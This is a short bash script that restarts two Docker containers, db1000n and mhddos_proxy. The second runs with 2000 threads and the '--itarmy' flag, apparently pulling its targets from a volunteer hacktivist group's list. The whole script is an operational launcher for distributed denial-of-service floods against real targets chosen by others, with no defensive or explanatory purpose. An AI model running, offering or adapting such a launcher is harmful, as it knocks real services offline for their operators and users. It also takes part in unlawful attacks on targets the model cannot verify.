#!/bin/bash

docker stop --name=db1000n
docker run --rm -it -d --name=db1000n --pull always ghcr.io/arriven/db1000n

docker stop --name=mhddos
docker run -it -d --rm --name=mhddos --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 2000  --itarmy